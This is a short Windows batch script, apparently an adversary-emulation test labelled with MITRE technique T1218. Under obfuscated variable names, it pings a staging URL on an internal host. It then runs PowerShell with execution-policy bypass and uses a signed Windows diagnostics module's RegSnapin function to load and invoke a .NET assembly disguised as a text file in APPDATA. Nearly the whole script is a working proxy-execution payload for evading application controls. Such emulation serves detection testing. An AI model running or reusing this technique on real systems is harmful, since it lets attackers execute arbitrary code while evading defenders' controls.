@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET hgrssy=%APPDATA%\9492\ccab2403
SET hlmzqm=https://10.0.0.49
SET gzqskh=https://10.0.0.49/stage/2/icon.png?9492-7
SET nqnrwb=ITZEL-S2B
SET vkuoyc=7
SET ydygmq=potoshop.txt
SET mkdrwl=9492
SET vneggl=%APPDATA%\!vkuoyc!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!nqnrwb!]: script_start=>> "!vneggl!" 2>nul
echo [!DATE! !TIME!][DEBUG][!nqnrwb!]: heartbeat_init=>> "!vneggl!" 2>nul
curl -k -s -o nul "!gzqskh!"
echo [!DATE! !TIME!][DEBUG][!nqnrwb!]: heartbeat_done=>> "!vneggl!" 2>nul
SET fxvzn=1
SET wjnxpo=
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin !hgrssy!\!ydygmq!;[Program.Class]::Dale()" >nul 2>&1
IF NOT !ERRORLEVEL! EQU 0 (SET fxvzn=0 & SET wjnxpo=assembly_load_failed)
echo [!DATE! !TIME!][!nqnrwb!]: !vkuoyc!-!mkdrwl!-T1218|Signed Binary Proxy Execution=!fxvzn!:!wjnxpo!>> "!vneggl!" 2>nul
echo [!DATE! !TIME!][DEBUG][!nqnrwb!]: ttp_executed=!fxvzn!>> "!vneggl!" 2>nul